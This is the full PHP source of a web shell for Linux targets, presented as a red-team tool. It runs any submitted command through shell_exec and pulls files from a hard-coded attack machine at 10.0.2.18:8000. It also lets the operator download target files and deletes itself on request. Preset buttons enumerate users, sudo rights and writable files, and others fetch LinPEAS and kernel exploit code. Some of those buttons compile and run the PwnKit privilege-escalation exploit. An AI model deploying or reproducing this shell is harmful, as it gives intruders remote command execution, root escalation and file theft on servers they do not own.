<?php
require_once 'initialize.php';
is_ip_authorized();
require_login();

session_start();

// Set attack box IP and port
$attackip = '10.0.2.18';
$attackport = 8000;

// Track uploaded/downloaded files
if (!isset($_SESSION['actions'])) {
    $_SESSION['actions'] = array();
}

if (isset($_GET['page']) && $_GET['page'] != "") {
    $page = $_GET['page'];
}

// Handle command execution
$command = isset($_POST['command']) ? $_POST['command'] : '';
$output = '';
if ($command) {
    $output = shell_exec($command . " 2>&1");
}

// Define menu structure
$menu = [
    "Home" => ["href" => "linux-nsscmdshell.php", "dropdown" => []],
    "About the Author" => ["href" => "?page=about", "dropdown" => []],
    "Publications" => [
        "href" => "#",
        "dropdown" => [
            "Online Anonymity" => "https://www.amazon.com/dp/B0FQRBYRMZ",
            "Red Team Manual - Linux Systems" => "https://www.amazon.com/Red-Team-Manual-Linux-Systems/dp/B0FR2BPKN5",
            "How to Dominate Local Search" => "https://www.amazon.com/How-Dominate-Local-Search-Marketing/dp/B0FRGH64GQ"
        ]
    ]
];

// Upload function
function upload_file($filename) {
    global $attackip, $attackport;

    $file_name = basename($filename);
    $url = "http://$attackip:$attackport/$file_name";

    $target_dir = __DIR__ . '/';
    if (!is_dir($target_dir)) mkdir($target_dir, 0755, true);

    $target_file = $target_dir . $file_name;

    $file_content = false;

    if (ini_get('allow_url_fopen')) {
        $file_content = @file_get_contents($url);
    }

    if ($file_content === false && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $file_content = curl_exec($ch);
        $curl_error = curl_error($ch);
        curl_close($ch);

        if ($file_content === false) {
            return "cURL failed to fetch '$file_name': $curl_error";
        }
    }

    if ($file_content === false) {
        return "Failed to fetch '$file_name' from $attackip:$attackport";
    }

    if (@file_put_contents($target_file, $file_content) === false) {
        return "Failed to save '$file_name' on target machine. Check permissions for directory: $target_dir";
    }

    // Track uploaded files in session
    if (!in_array($file_name, $_SESSION['actions'])) {
        $_SESSION['actions'][] = $file_name;
    }

    return "Fetched and saved '$file_name' successfully to '$target_file'";
}

// Handle file uploads
$upload_status = '';
if (isset($_FILES['upload_file'])) {
    $file_error = $_FILES['upload_file']['error'];
    $file_name  = basename($_FILES['upload_file']['name']);

    switch ($file_error) {
        case UPLOAD_ERR_OK:
            $upload_status = upload_file($file_name);
            break;
        case UPLOAD_ERR_INI_SIZE:
        case UPLOAD_ERR_FORM_SIZE:
            $upload_status = "Upload failed: File '$file_name' exceeds maximum allowed size.";
            break;
        case UPLOAD_ERR_PARTIAL:
            $upload_status = "Upload failed: File '$file_name' was only partially uploaded.";
            break;
        case UPLOAD_ERR_NO_FILE:
            $upload_status = "Upload failed: No file was uploaded.";
            break;
        case UPLOAD_ERR_NO_TMP_DIR:
            $upload_status = "Upload failed: Missing temporary folder on target server.";
            break;
        case UPLOAD_ERR_CANT_WRITE:
            $upload_status = "Upload failed: Cannot write file '$file_name' to disk. Check directory permissions.";
            break;
        case UPLOAD_ERR_EXTENSION:
            $upload_status = "Upload failed: A PHP extension stopped the file upload for '$file_name'.";
            break;
        default:
            $upload_status = "Upload failed: Unknown error code $file_error for file '$file_name'.";
            break;
    }
}

// Handle downloads
$download_status = '';
if (isset($_GET['download'])) {
    $file = basename($_GET['download']);
    $file_path = __DIR__ . '/' . $file;
    if (file_exists($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $file . '"');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    } else {
        $download_status = "File '$file' does not exist!";
    }
}

// Cleanup Function
$clean_status = '';
if (isset($_GET['clean'])) {
    if (!isset($_SESSION['actions']) || empty($_SESSION['actions'])) {
        $clean_status = "No files to clean up.";
    } else {
        $deleted = [];
        $failed  = [];
        foreach ($_SESSION['actions'] as $file) {
            $file_path = __DIR__ . '/uploads/' . $file;
            if (file_exists($file_path)) {
                if (@unlink($file_path)) {
                    $deleted[] = $file;
                } else {
                    $failed[] = $file;
                }
            } else {
                $failed[] = $file . " (not found)";
            }
        }

        unset($_SESSION['actions']);
        session_destroy();

        $clean_status  = "<strong>Cleanup completed.</strong><br>";
        if (!empty($deleted)) {
            $clean_status .= "Deleted files:<br>" . implode("<br>", $deleted) . "<br>";
        }
        if (!empty($failed)) {
            $clean_status .= "Failed to delete:<br>" . implode("<br>", $failed) . "<br>";
        }

        $clean_status .= '<br>Do you also want to delete the shell itself? 
            <form method="get" style="margin-top:5px;">
                <button name="kill_me" class="btn btn-danger">Delete nsscmdshell.php</button>
                <button name="keep_shell" class="btn btn-warning">Keep Shell</button>
            </form>';
    }
}

if (isset($_GET['kill_me'])) {
    if (@unlink(__FILE__)) {
        echo '<div style="color:green;">Shell deleted successfully.</div>';
        exit;
    } else {
        echo '<div style="color:red;">Failed to delete shell.</div>';
    }
}

if (isset($_POST['quicklinks_toggle'])) {
    $_SESSION['quicklinks'] = isset($_POST['quicklinks_checkbox']) && $_POST['quicklinks_checkbox'] === 'on';
}

$show_quicklinks = isset($_SESSION['quicklinks']) && $_SESSION['quicklinks'] === true;

?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>The Not so Simple PHP Command Shell (for Linux)</title>
<style>
body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; }
input[type=text], input[type=file] { width: 60%; background: #2e2e2e; color: #d4d4d4; border: 1px solid #555; }
input[type=submit], button { background: #007acc; color: #fff; border: none; padding: 5px 10px; cursor: pointer; margin: 2px; }
pre { background: #2e2e2e; padding: 10px; border: 1px solid #555; overflow-x: auto; }
form.inline { display: inline; }
h3 { margin-top: 20px; }
nav { background: #333; }
.menu { display: flex; flex-wrap: wrap; list-style: none; margin: 0; padding: 0; }
.menu li { position: relative; }
.menu > li { flex: 1; }
.menu a { display: block; padding: 14px 20px; color: #fff; text-decoration: none; }
.menu a:hover { background: #555; }
.dropdown { display: none; position: absolute; background: #444; list-style: none; margin: 0; padding: 0; min-width: 150px; }
.dropdown li a { padding: 10px; }
li:hover .dropdown { display: block; }
.toggle { display: none; background: #333; padding: 14px; color: #fff; cursor: pointer; }
@media (max-width: 768px) { .menu { flex-direction: column; display: none; } .menu li { flex: none; } .menu.show { display: flex; } .toggle { display: block; } }
</style>
</head>
<body>
<nav>
    <div class="toggle" onclick="document.querySelector('.menu').classList.toggle('show')">☰ Menu</div>
    <ul class="menu">
        <?php foreach ($menu as $name => $data): ?>
            <li>
                <a href="<?= $data['href'] ?>"><?= $name ?></a>
                <?php if (!empty($data['dropdown'])): ?>
                    <ul class="dropdown">
                        <?php foreach ($data['dropdown'] as $subName => $subHref): ?>
                            <li><a href="<?= $subHref ?>"><?= $subName ?></a></li>
                        <?php endforeach; ?>
                    </ul>
                <?php endif; ?>
            </li>
        <?php endforeach; ?>
    </ul>
</nav>

<?php 
switch($page) {
	case 'about';
?>	

<section id="about" style="padding:50px;">
    <h2>About the Author of This Tool</h2>
    <p>Kaotick Jay (pronounced kay-ah-tick jay), is a veteran cybersecurity professional, author, digital strategist, and developer with over 30 years of experience in technology. He specializes in red team penetration testing, digital forensics, incident response, risk management, Linux systems, and offensive security operations, having conducted hundreds of penetration tests and forensic investigations while advising organizations on HIPAA, PCI DSS, and ISO 27001 compliance.</p>

	<p>Kaotick Jay is a skilled developer, proficient in more than two dozen programming languages - including Python, PHP, HTML5/CSS3/JavaScript, Ruby, Rust, and Go - and is recognized for developing custom offensive security tools and scripts that support red team operations and cybersecurity research.</p>

	<p>In addition to his cybersecurity expertise, he is an authority in search engine optimization (SEO) and local digital marketing, helping businesses - small and large - build visible, secure, and competitive online presences.</p>

	<p>He is the author of multiple books, including:</p>
	<ul>
		<li>Online Anonymity: Privacy, OPSEC, and the Art of Being Invisible</li>
		<li>Protecting Yourself from Remote Access Scams</li>
		<li>Red Team Manual: Linux Systems (1st & 2nd Editions)</li>
		<li>Detecting Persistence on Windows Computers: A Guide for Non-Technical Users</li>
		<li>How to Dominate Local Search: The All in One Digital Marketing Guide for Small Business Owners (1st & 2nd Editions)</li>
		<li>Adapting The Moscow Rules for Cybersecurity Operations</li>
	</ul>
	
	<p>Beyond writing and consulting, Kaotick Jay remains committed to training the next generation of cybersecurity professionals, sharing not only the technical aspects of offensive security but also the discipline, ethics, and mindset required to operate effectively in high-stakes environments.</p>
</section>
<?php 
	break;
	default:
?>
<h2>The Not so Simple PHP Command Shell (for Linux)</h2>
<!-- Quick Links Toggle Form -->
<form method="POST" style="margin:10px 0;">
    <label style="color:#d4d4d4;">
        <input type="checkbox" name="quicklinks_checkbox" <?php if($show_quicklinks) echo 'checked'; ?> />
        Show Helpful Pentest Links
    </label>
    <input type="hidden" name="quicklinks_toggle" value="true" />
    <input type="submit" value="Apply" style="background:#007acc;color:#fff;border:none;padding:5px 10px;margin-left:10px;" />
</form>
<?php
if ($show_quicklinks) {
    echo '<div style="width:55%;margin:20px;padding:20px 30px;color:#d4d4d4;background-color:#1e1e1e;border:1px solid #555;font-size:1.1em;">
        <p style="font-weight:bold;">Helpful Pentest Links:</p>
		<a href="https://github.com/frizb/MSF-Venom-Cheatsheet" target="_blank" style="color:#00ccff;">Msfvenom Cheat Sheet</a><br>
		<a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" style="color:#00ccff;">Reverse Shell Cheat Sheet</a><br>
		<a href="https://www.exploit-db.com/" target="_blank" style="color:#00ccff;">ExploitDB</a><br>
		<a href="https://cxsecurity.com/exploit/" target="_blank" target="_blank" style="color:#00ccff;">CX Security Vulnerability Database</a><br>
        <a href="https://book.hacktricks.wiki/en/index.html" target="_blank" style="color:#00ccff;">HackTricks</a><br>
        <a href="https://gtfobins.github.io/" target="_blank" style="color:#00ccff;">GTFOBins (Sudo/Privilege Escalation Binaries)</a><br>
        <a href="https://www.exploit-db.com/" target="_blank" style="color:#00ccff;">Exploit-DB</a><br>
        <a href="https://www.revshells.com/" target="_blank" style="color:#00ccff;">Reverse Shell Generator (Linux)</a><br>
        <a href="https://www.hackingarticles.in/penetration-testing/" target="_blank" style="color:#00ccff;">Penetration Testing Articles</a><br>
        <a href="https://www.geeksforgeeks.org/linux-unix/linux-commands-cheat-sheet/" target="_blank" style="color:#00ccff;">Linux Commands Cheat Sheet</a><br>
    </div>';
}
?>

<h3>Command Execution:</h3>
<form method="POST">
    <input type="text" name="command" placeholder="Enter Linux command" autofocus />
    <input type="submit" value="Run" />
</form>

<h3>Upload Files from Attack Machine to This Machine:</h3>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="upload_file" required />
    <input type="submit" value="Upload" />
</form>

<h3>Download Files from This Machine to Attack Machine:</h3>
<form method="GET">
    <input type="text" name="download" placeholder="Enter filename to download" required />
    <input type="submit" value="Download" />
</form>

<h3>Tasks:</h3>

<h3>System & OS Info:</h3>
<form method="POST" class="inline"><input type="hidden" name="command" value="uname -a" /><button type="submit">System Info</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="cat /etc/os-release" /><button type="submit">OS Release</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="uptime" /><button type="submit">Uptime</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="df -h" /><button type="submit">Disk Usage</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="free -h" /><button type="submit">Memory Usage</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="lscpu" /><button type="submit">CPU Info</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="lsblk" /><button type="submit">Block Devices</button></form>

<h3>File System & Webroot:</h3>
<form method="POST" class="inline"><input type="hidden" name="command" value="ls -la /var/www/html" /><button type="submit">List Webroot Files</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="find / -type f -name '*.conf' 2>/dev/null" /><button type="submit">Find Config Files</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="find / -user root -type f 2>/dev/null" /><button type="submit">Root-Owned Files</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="find / -type d -writable 2>/dev/null" /><button type="submit">Writable Directories</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="find / -type f -perm -o+w 2>/dev/null" /><button type="submit">World-Writable Files</button></form>

<h3>Users & Groups:</h3>
<form method="POST" class="inline"><input type="hidden" name="command" value="id" /><button type="submit">Current User ID</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="whoami" /><button type="submit">Whoami</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="cut -d: -f1 /etc/passwd" /><button type="submit">List Users</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="cut -d: -f1 /etc/group" /><button type="submit">List Groups</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="sudo -l 2>/dev/null" /><button type="submit">Check Sudo Privileges</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="for u in $(cut -f1 -d: /etc/passwd); do echo 'User: $u'; crontab -u $u -l 2>/dev/null; done" /><button type="submit">Check Crontabs</button></form>

<h3>Processes & Resources:</h3>
<form method="POST" class="inline"><input type="hidden" name="command" value="ps aux" /><button type="submit">Running Processes</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="ps aux --sort=-%mem | head -n 10" /><button type="submit">Top Memory Processes</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="ps aux --sort=-%cpu | head -n 10" /><button type="submit">Top CPU Processes</button></form>

<h3>Network & Connectivity:</h3>
<form method="POST" class="inline"><input type="hidden" name="command" value="netstat -tulnp" /><button type="submit">Listening Ports</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="nslookup google.com" /><button type="submit">DNS Test</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="ping -c 4 8.8.8.8" /><button type="submit">Ping 8.8.8.8</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="traceroute 8.8.8.8" /><button type="submit">Traceroute</button></form>

<h3>Packages & Installed Software:</h3>
<form method="POST" class="inline"><input type="hidden" name="command" value="dpkg -l 2>/dev/null" /><button type="submit">Debian Packages</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="rpm -qa 2>/dev/null" /><button type="submit">RHEL Packages</button></form>

<h3>Firewall & Security:</h3>
<form method="POST" class="inline"><input type="hidden" name="command" value="iptables -L -n -v" /><button type="submit">Firewall Rules</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="cat /etc/hosts.allow" /><button type="submit">Hosts Allow</button></form>
<form method="POST" class="inline"><input type="hidden" name="command" value="cat /etc/hosts.deny" /><button type="submit">Hosts Deny</button></form>

<h3>Privilege Escalation Enumeration (LinPEAS):</h3>
<form method="POST" class="inline">
    <input type="hidden" name="command" value="curl -L -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/download/20250904-27f4363e/linpeas.sh" />
    <button type="submit">Download linpeas.sh</button>
</form>

<form method="POST" class="inline">
    <input type="hidden" name="command" value="chmod +x linpeas.sh" />
    <button type="submit">Make linpeas.sh Executable</button>
</form>

<form method="POST" class="inline">
    <input type="hidden" name="command" value="./linpeas.sh -a > linny 2>&1" />
    <button type="submit">Run linpeas.sh (Output to linny)</button>
</form>

<h3>Kernel Exploit Downloads:</h3>

<form method="POST" class="inline">
    <input type="hidden" name="command" value="curl -L -o exp_cve-2022-32250.c https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c" />
    <button type="submit">Download CVE-2022-32250 PoC</button>
</form>

<form method="POST" class="inline">
    <input type="hidden" name="command" value="curl -L -o exp_cve-2022-2586.c https://www.openwall.com/lists/oss-security/2022/08/29/5/1" />
    <button type="submit">Download CVE-2022-2586 PoC</button>
</form>

<form method="POST" class="inline">
    <input type="hidden" name="command" value="curl -L -o exp_cve-2021-22555.c https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c" />
    <button type="submit">Download CVE-2021-22555 PoC</button>
</form>

<form method="POST" class="inline">
    <input type="hidden" name="command" value="curl -L -o exp_cve-2019-13272.c https://raw.githubusercontent.com/snorez/exploits/refs/heads/master/xfrm_poc_RE_challenge/lucky0_RE.c" />
    <button type="submit">Download CVE-2019-15666 PoC</button>
</form>

<form method="POST" class="inline">
    <input type="hidden" name="command" value="curl -L -o exp_cve-2019-13272.c https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c" />
    <button type="submit">Download CVE-2019-13272 PoC</button>
</form>

<h3>PwnKit (Polkit) Exploits:</h3>
<form method="POST" class="inline">
    <input type="hidden" name="command" value="curl -L -o pwnkit.c https://raw.githubusercontent.com/antonioCoco/CVE-2021-4034/main/pwnkit.c" />
    <button type="submit">Download PwnKit C PoC</button>
</form>

<form method="POST" class="inline">
    <input type="hidden" name="command" value="curl -L -o pwnkit.py https://raw.githubusercontent.com/antonioCoco/CVE-2021-4034/main/pwnkit.py" />
    <button type="submit">Download PwnKit Python PoC</button>
</form>

<form method="POST" class="inline">
    <input type="hidden" name="command" value="chmod +x pwnkit.c" />
    <button type="submit">chmod +x pwnkit.c</button>
</form>

<form method="POST" class="inline">
    <input type="hidden" name="command" value="gcc pwnkit.c -o pwnkit && ./pwnkit" />
    <button type="submit">Compile & Run PwnKit C</button>
</form>

<form method="POST" class="inline">
    <input type="hidden" name="command" value="python3 pwnkit.py" />
    <button type="submit">Run PwnKit Python</button>
</form>

<h3>Cleanup Uploaded/Downloaded Files:</h3>
<form method="GET">
    <input type="hidden" name="clean" value="true" />
    <input type="submit" value="Cleanup" />
</form>

<?php
if ($command) echo "<h3>Command: $command</h3><pre id=\"command_output\">$output</pre>";
if ($upload_status) echo "<h3>Upload Status:</h3><pre>$upload_status</pre>";
if ($download_status) echo "<h3>Download Status:</h3><pre>$download_status</pre>";
if ($clean_status) echo "<h3>Cleanup Status:</h3><pre>$clean_status</pre>";
?>

<button id="gotoOutputBtn" style="
    position: fixed;
    bottom: 20px;
    right: 20px;
    background-color: #007acc;
    color: #fff;
    border: none;
    padding: 10px 15px;
    cursor: pointer;
    border-radius: 5px;
    z-index: 1000;
">Go to Output</button>

<script>
document.getElementById('gotoOutputBtn').addEventListener('click', function() {
    const preBlocks = document.querySelectorAll('pre');
    if (preBlocks.length > 0) {
        const lastPre = preBlocks[preBlocks.length - 1];
        lastPre.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
});
</script>
<?php 
	}
?>	
</body>
</html>
